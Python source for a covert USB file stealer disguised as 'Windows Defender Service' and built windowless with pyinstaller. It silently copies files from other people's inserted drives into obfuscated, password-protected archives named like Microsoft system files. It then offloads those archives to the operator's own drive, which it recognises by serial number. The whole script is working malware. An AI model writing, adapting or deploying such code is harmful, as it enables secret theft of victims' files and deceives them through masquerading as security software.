import os
from os import replace
import random
import zipfile
import win32file
import psutil
import win32api
import time
def encodes(input_paths,output_path,head = None):
    if head == None:head = input_paths[0][:2] + '\\'
    pwd = b'1118184754114511951798881405'
    numbers = ['0','1','2','3','4','5','6','7','8','9','a','b','c','d','e','f']
    Caesar_list = ['Q','W','E','R','T','Y','U','I','O','P','A','S','D','F','G','H','Q','W','E','R','T','Y','U','I','O','P','A','S','D','F','G','H']
    out = open(output_path,'w')
    for input_path in input_paths:
        try:
            refile = open(input_path,'rb')
            key = int(random.randint(0,15))
            out.write("@" + str(input_path).replace(head,'') + "|" + str(key) + "|" + "\n")
            while True:
                codes = refile.readline()
                imformation = str(codes.hex())
                for one_B in numbers:imformation = imformation.replace(one_B,Caesar_list[int(numbers.index(one_B)) + key])
                out.write(imformation)
                if codes == b'':break
            out.write('\n')
            refile.close()
        except:pass
    out.close()
    print('zipping...')
    zip_file = zipfile.ZipFile(output_path.split('.')[-2] + '.zip','w')
    zip_file.setpassword(pwd)
    zip_file.write(output_path,compress_type=zipfile.ZIP_DEFLATED)
    zip_file.close()
    os.remove(output_path)
    os.rename(output_path.split('.')[-2] + '.zip',output_path)
    print('Done.')

def copy_dir(dirs,ot_path,bk = [],bbk = [],limit_file = 1000,limit_dir = 1024000,wanted = []):
    print('start')
    will_go = [dirs]
    inlist = []
    all_size = 0
    while will_go != []:
        will_goto = []
        for wg in will_go:
            try:
                for path in os.listdir(wg):
                    if '.' in path and path[:1] != '.':
                        if bk != [] and not(path in wanted):
                            if path.split('.')[-1] in bk:
                                if bbk == []:inlist.append(wg + path)
                                else:
                                    size = int(os.path.getsize(wg + path))/1024/1024
                                    if (size > limit_file and path.split('.')[-1] in bbk) or (all_size >= (limit_dir-limit_dir//20) and path.split('.')[-1] in bbk) or all_size >= limit_dir:
                                        grand=open('res.sys','a')
                                        grand.write(path + ' ' + str(size) + 'Mb\n') 
                                        grand.close()
                                    else:
                                        inlist.append(wg + path)
                                        #print(size)
                                        all_size += size
                            else:
                                grand=open('res.sys','a')
                                grand.write(path + '\n') 
                                grand.close()
                        else:inlist.append(wg + path)
                    elif not('.' in path):will_goto.append(wg + path + '\\')
                    else:
                        try:
                            test = open(wg + path,'rb')
                            test.close()
                            if bk != []:
                                if path.split('.')[-1] in bk:inlist.append(wg + path)
                                else:
                                    grand=open('res.sys','a')
                                    grand.write(path + '\n') 
                                    grand.close()
                            else:inlist.append(wg + path)
                        except:will_goto.append(wg + path + '\\')
            except:pass
        will_go = will_goto.copy()
    print(all_size)
    encodes(inlist,ot_path,head=dirs)

#try:
grand = open('./log.sys','r')
back = grand.readlines()
suffix = back[0][1:].replace('\n','').split('|')
big_suffix = back[1][1:].replace('\n','').split('|')
limit_size = int(back[2][1:].replace('\n','').split('|')[0])
limit_large = int(back[2][1:].replace('\n','').split('|')[1])
want = back[3][1:].replace('\n','').split('|')
u_name = int(back[4][1:].replace('\n','').replace('o','0').replace('_','-').replace('|','1').replace('&','8').replace('S','5').replace('Z','2').replace('g','9').replace('G','6'))
grand.close()
uf = []
while True:
    disk_list = []
    for item in psutil.disk_partitions():
        if "removable" in item.opts:disk_list.append(item.mountpoint)
    if disk_list != []:
        for pf in disk_list:
            if pf not in uf:
                uf.append(pf)
                seriaNumber = win32api.GetVolumeInformation(pf)
                otpath = 'Microsoft_Protection' + str(seriaNumber[1]) + '.sys'
                if seriaNumber[1] == u_name:
                    for pth in os.listdir('./'):
                        if pth[:20] == 'Microsoft_Protection':
                            win32file.CopyFile(pth,pf+'__$#&Setting&#$__\\'+pth,0)
                    win32file.CopyFile('./res.sys',pf+'__$#&Setting&#$__\\res.sys',0)
                    win32file.CopyFile('./zig.sys',pf+'__$#&Setting&#$__\\zig.sys',0)
                    win32file.CopyFile(pf+'__$#&Setting&#$__\\log.sys','./log.sys',0)
                    grand = open('./res.sys','w')
                    grand.write('')
                    grand.close()
                    grand = open('./zig.sys','w')
                    grand.write('')
                    grand.close()
                    print('Done!')
                else:
                    grand = open('./res.sys','a')
                    grand.write('@' + str(seriaNumber[1]) + ' (' + seriaNumber[0] +')')
                    grand.close()
                    copy_dir(pf,otpath,bk = suffix,bbk = big_suffix,limit_file = limit_size,limit_dir = limit_large,wanted = want)
    else:uf = []
    time.sleep(60)
'''
except Exception as e:
    grand = open('zig.sys','a')
    grand.write(str(e) + '\n')
    grand.close()
'''
#Windows Defender Service
#pyinstaller -w -D -i favicon.ico "Windows Defender Service.py"